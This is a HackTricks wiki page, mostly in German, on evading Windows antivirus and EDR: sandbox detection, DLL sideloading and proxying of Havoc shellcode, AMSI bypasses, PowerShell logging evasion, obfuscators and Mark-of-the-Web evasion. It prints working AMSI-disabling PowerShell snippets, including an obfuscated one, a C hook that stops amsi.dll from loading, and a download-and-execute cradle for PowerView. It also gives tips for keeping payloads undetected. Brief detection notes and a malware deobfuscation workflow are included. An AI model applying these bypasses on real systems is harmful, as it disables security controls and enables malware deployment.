# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender daran zu hindern, zu funktionieren.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender zum Absturz zu bringen, indem ein anderes AV vorgetäuscht wird.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Derzeit nutzen AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: static detection, dynamic analysis und bei fortgeschrittenen EDRs behavioural analysis.

### **Static detection**

Static detection funktioniert, indem bekannte bösartige Strings oder Byte-Arrays in einem Binary oder Script markiert werden, und indem Informationen aus der Datei selbst extrahiert werden (z. B. file description, company name, digital signatures, icon, checksum, etc.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dich leichter auffliegen lassen kann, da diese wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt einige Wege, um diese Art der Erkennung zu umgehen:

- **Encryption**

Wenn du das Binary verschlüsselst, gibt es für AV keine Möglichkeit, dein Programm zu erkennen, aber du brauchst irgendeinen Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuscation**

Manchmal reicht es, einige Strings in deinem Binary oder Script zu ändern, um am AV vorbeizukommen, aber das kann je nachdem, was du verschleiern willst, zeitaufwändig sein.

- **Custom tooling**

Wenn du deine eigenen Tools entwickelst, gibt es keine bekannten schlechten Signaturen, aber das kostet viel Zeit und Aufwand.

> [!TIP]
> Ein guter Weg, gegen Windows Defender static detection zu testen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Grunde in mehrere Segmente und veranlasst Defender, jedes einzeln zu scannen; so kann es dir genau sagen, welche Strings oder Bytes in deinem Binary markiert werden.

Ich empfehle dringend, dir diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis ist, wenn das AV dein Binary in einer sandbox ausführt und auf bösartige Aktivitäten achtet (z. B. versuchen, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen minidump von LSASS zu erstellen, etc.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

Es hat sich herausgestellt, dass der Sandbox-Computername von Microsoft Defender HAL9TH ist. Du kannst also vor der Detonation in deiner Malware den Computernamen prüfen; wenn der Name HAL9TH ist, befindest du dich in Defenders Sandbox und kannst dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) für den Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev Kanal</p></figcaption></figure>

Wie bereits in diesem Beitrag gesagt: public tools werden früher oder später erkannt, also solltest du dir etwas fragen:

Zum Beispiel, wenn du LSASS dumpen willst, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann.

Die richtige Antwort ist wahrscheinlich Letzteres. Am Beispiel von mimikatz ist es wahrscheinlich eines der, wenn nicht das am meisten markierte Stück Malware durch AVs und EDRs. Während das Projekt an sich super ist, ist es auch ein Albtraum, damit herumzuwerkeln, um AVs zu umgehen. Suche also nach Alternativen für das, was du erreichen willst.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, stelle sicher, dass du die automatische Sample-Submission in Defender deaktivierst, und bitte, im Ernst, LÄD NIE AUF VIRUSTOTAL HOCH, wenn dein Ziel langfristige Evasion ist. Wenn du prüfen möchtest, ob deine Payload von einem bestimmten AV erkannt wird, installiere es in einer VM, versuche die automatische Sample-Submission auszuschalten und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer es möglich ist, priorisiere immer die Verwendung von DLLs für Evasion. Nach meiner Erfahrung werden DLL-Dateien normalerweise viel weniger erkannt und analysiert, daher ist es ein sehr einfacher Trick, um in manchen Fällen die Erkennung zu vermeiden (vorausgesetzt, deine Payload kann als DLL ausgeführt werden).

Wie wir in diesem Bild sehen können, hat ein DLL Payload von Havoc eine Erkennungsrate von 4/26 auf antiscan.me, während das EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me Vergleich eines normalen Havoc EXE Payloads vs eines normalen Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, die du mit DLL-Dateien anwenden kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem sowohl die Opferanwendung als auch die malicious payload(s) nebeneinander positioniert werden.

Du kannst nach Programmen suchen, die für DLL Sideloading anfällig sind, mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking anfällig sind, innerhalb von "C:\Program Files\\" und die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **DLL Hijackable/Sideloadable programs selbst untersuchst**, diese Technik ist bei richtiger Anwendung ziemlich unauffällig, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, könntest du leicht erwischt werden.

Einfach eine bösartige DLL mit dem Namen zu platzieren, den ein Programm zu laden erwartet, lädt nicht automatisch dein payload, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy-(und bösartige) DLL macht, an die Original-DLL weiter, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung deines payloads gehandhabt werden kann.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Das sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcode-Vorlage und die ursprüngliche, umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die proxy DLL haben eine 0/26 Erkennungsrate auf [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg werten.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass Sie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading ansehen und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), um mehr über das zuvor Besprochene zu erfahren.

### Ausnutzen von Forwarded Exports (ForwardSideLoading)

Windows PE-Module können Funktionen exportieren, die tatsächlich "forwarders" sind: anstatt auf Code zu verweisen, enthält der Exporteintrag einen ASCII-String der Form `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, wird der Windows-Loader:

- Lädt `TargetDll`, falls es noch nicht geladen ist
- Löst `TargetFunc` daraus auf

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Ist `TargetDll` keine KnownDLL, wird die normale DLL-Suchreihenfolge benutzt, die auch das Verzeichnis des Moduls einschließt, das die Forward-Auflösung vornimmt.

Dies ermöglicht eine indirekte sideloading-Primitive: Finde eine signierte DLL, die eine Funktion exportiert, die an einen nicht-KnownDLL-Modulnamen weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL im selben Verzeichnis, die genau den Namen des weitergeleiteten Zielmoduls trägt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch deine DllMain ausgeführt wird.

Beobachtetes Beispiel unter Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Platziere eine bösartige `NCRYPTPROV.dll` im selben Ordner. Eine minimale DllMain reicht aus, um code execution zu erreichen; man muss die forwarded function nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Triggern Sie das Forward mit einem signierten LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signiert) lädt die side-by-side `keyiso.dll` (signiert)
- Während der Auflösung von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhält man einen "missing API"-Fehler erst, nachdem `DllMain` bereits ausgeführt wurde

Hinweise zur Erkennung:
- Konzentriere dich auf weitergeleitete Exporte, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Du kannst weitergeleitete Exporte mit Tools wie:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 Forwarder-Inventar, um Kandidaten zu finden: https://hexacorn.com/d/apis_fwd.txt

Erkennungs-/Abwehrideen:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Melde Prozess-/Modulketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` in von Benutzern beschreibbaren Pfaden
- Durchsetzen von Code-Integritätsrichtlinien (WDAC/AppLocker) und das Verweigern von write+execute in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Sie können Freeze verwenden, um Ihren shellcode auf unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen entdeckt werden. Verlasse dich daher niemals nur auf ein Tool — sofern möglich, versuche mehrere Evasion-Techniken zu verketten.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde geschaffen, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Anfangs konnten AVs nur **files on disk** scannen, sodass Payloads, die **directly in-memory** ausgeführt wurden, von den AVs nicht gestoppt werden konnten, da diese nicht genügend Einsicht hatten.

Die AMSI-Funktion ist in folgende Windows-Komponenten integriert:

- User Account Control, or UAC (Erhöhung von EXE-, COM-, MSI- oder ActiveX-Installationen)
- PowerShell (Skripte, interaktive Nutzung und dynamische Code-Auswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office VBA macros

Sie erlaubt Antivirus-Lösungen, das Verhalten von Skripten zu inspizieren, indem Skriptinhalte in einer Form offengelegt werden, die weder verschlüsselt noch obfuskiert ist.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt die folgende Warnung von Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführenden Datei angibt — in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem wegen AMSI im Speicher entdeckt.

Außerdem wird C#-Code ab **.NET 4.8** ebenfalls durch AMSI geprüft. Das betrifft sogar `Assembly.Load(byte[])` für in-memory Ausführung. Deshalb wird empfohlen, für in-memory Ausführung niedrigere .NET-Versionen (z. B. 4.7.2 oder älter) zu verwenden, wenn man AMSI umgehen möchte.

Es gibt ein paar Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

  Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die du laden willst, eine gute Methode zur Umgehung sein.

  Allerdings besitzt AMSI die Fähigkeit, Skripte zu deobfuskieren, selbst bei mehreren Schichten, sodass Obfuscation je nach Umsetzung eine schlechte Option sein kann. Das macht die Umgehung nicht ganz trivial. Manchmal reicht aber schon das Ändern einiger Variablennamen, und es funktioniert — es hängt davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

  Da AMSI implementiert wird, indem eine DLL in den powershell- (und auch cscript.exe-, wscript.exe- usw.) Prozess geladen wird, ist es möglich, diese einfach zu manipulieren, selbst wenn man als unprivilegierter Benutzer läuft. Aufgrund dieses Implementierungsfehlers haben Forscher mehrere Methoden gefunden, AMSI-Scans zu umgehen.

**Forcing an Error**

Das Erzwingen eines Fehlers bei der Initialisierung von AMSI (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht; Microsoft hat daraufhin eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es reichte eine einzige Zeile powershell-Code, um AMSI für den aktuellen powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher ist eine Modifikation nötig, um diese Technik zu verwenden.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich auffallen wird, sobald dieser Beitrag veröffentlicht wird — du solltest daher keinen Code veröffentlichen, wenn dein Plan ist, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der vom Benutzer bereitgestellten Eingabe) zu finden und sie mit Instruktionen zu überschreiben, die den Code für E_INVALIDARG zurückgeben; auf diese Weise liefert der eigentliche Scan das Ergebnis 0, das als sauber interpretiert wird.

> [!TIP]
> Bitte lesen Sie [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blockieren von AMSI durch Verhindern des Ladens von amsi.dll (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User‑Mode‑Hook auf `ntdll!LdrLoadDll` zu platzieren, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und es finden keine Scans für diesen Prozess statt.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert sowohl mit PowerShell, WScript/CScript als auch mit benutzerdefinierten Loadern (alles, was sonst AMSI laden würde).
- Kombiniere es mit dem Übergeben von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Kommandozeilenartefakte zu vermeiden.
- Wurde bei Loadern verwendet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Die erkannte Signatur entfernen**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool arbeitet, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur durchsucht und diese dann mit NOP-Instruktionen überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst das so tun:
```bash
powershell.exe -version 2
```
## PS-Protokollierung

Die PowerShell-Protokollierung ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das ist nützlich für Audits und Fehlerbehebung, kann aber auch ein **Problem für Angreifer sein, die die Erkennung umgehen wollen**.

Um die PowerShell-Protokollierung zu umgehen, können Sie die folgenden Techniken verwenden:

- **Disable PowerShell Transcription and Module Logging**: Sie können ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) dafür verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne von AMSI gescannt zu werden. So: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine unmanaged PowerShell-Sitzung ohne Schutzmechanismen zu starten (das ist, was `powerpick` von Cobal Strike verwendet).


## Obfuskation

> [!TIP]
> Mehrere Obfuskationstechniken beruhen auf der Verschlüsselung von Daten, was die Entropie der Binary erhöht und es AVs und EDRs erleichtert, sie zu entdecken. Seien Sie vorsichtig damit und verschlüsseln Sie ggf. nur spezifische Abschnitte Ihres Codes, die sensibel sind oder verborgen bleiben müssen.

### Deobfuskation von ConfuserEx-geschützten .NET-Binärdateien

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, trifft man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der untenstehende Workflow **stellt zuverlässig ein nahezu originales IL wieder her**, das anschließend mit Tools wie dnSpy oder ILSpy nach C# dekompiliert werden kann.

1.  Entfernen des Anti-Tamper-Schutzes – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Konstruktor des *module* (`<Module>.cctor`). Dadurch wird auch die PE-Checksumme gepatcht, sodass jede Änderung das Binary zum Absturz bringt. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine saubere Assembly zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Wiederherstellung von Symbolen / Control-Flow – geben Sie die *clean*-Datei an **de4dot-cex** (ein ConfuserEx-bewusster Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot wird Control-Flow-Flattening rückgängig machen, originale Namespaces, Klassen und Variablennamen wiederherstellen und konstante Strings entschlüsseln.

3.  Entfernen von Proxy-Calls – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (a.k.a *proxy calls*), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` sehen, anstatt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …).

4.  Manuelle Bereinigung – führen Sie das resultierende Binary in dnSpy aus, suchen Sie nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *eigentliche* Payload zu finden. Oft speichert die Malware diese als TLV-codiertes Byte-Array, das in `<Module>.byte_0` initialisiert wird.

Die oben beschriebene Kette stellt den Ausführungsfluss **wieder her, ohne** das bösartige Sample ausführen zu müssen – nützlich beim Arbeiten auf einem Offline-Arbeitsplatz.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Kompilierungs-Suite bereitzustellen, der erhöhte Softwaresicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und tamper-proofing bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die `C++11/14`-Sprache verwendet, um zur Compile-Zeit obfuscated code zu erzeugen, ohne ein externes Tool zu nutzen und ohne den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht von obfuscated operations hinzu, die vom C++ template metaprogramming framework erzeugt werden und das Leben der Person, die die Anwendung cracken will, etwas erschweren.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der in der Lage ist, verschiedene PE-Dateien zu obfuscate, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphic code engine für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein granuliertes code obfuscation framework für LLVM-unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuscates ein Programm auf der Ebene des assembly code, indem reguläre Instruktionen in ROP chains transformiert werden und so unsere natürliche Vorstellung von normalem control flow vereitelt.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann existierende EXE/DLL in shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

Vielleicht haben Sie diesen Bildschirm gesehen, wenn Sie ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich reputationsbasiert, das heißt, selten heruntergeladene Anwendungen lösen SmartScreen aus, warnen und verhindern so, dass der Endbenutzer die Datei ausführt (obwohl die Datei durch Klicken auf More Info -> Run anyway weiterhin ausgeführt werden kann).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Prüfen des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Wichtig zu wissen: Ausführbare Dateien, die mit einem **trusted signing certificate** signiert sind, lösen SmartScreen **nicht aus**.

Eine sehr effektive Methode, um zu verhindern, dass Ihre payloads das Mark of The Web erhalten, besteht darin, sie in einem Container wie einer ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **non NTFS volumes** angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das payloads in Ausgabecointainer packt, um Mark-of-the-Web zu umgehen.

Beispielhafte Verwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
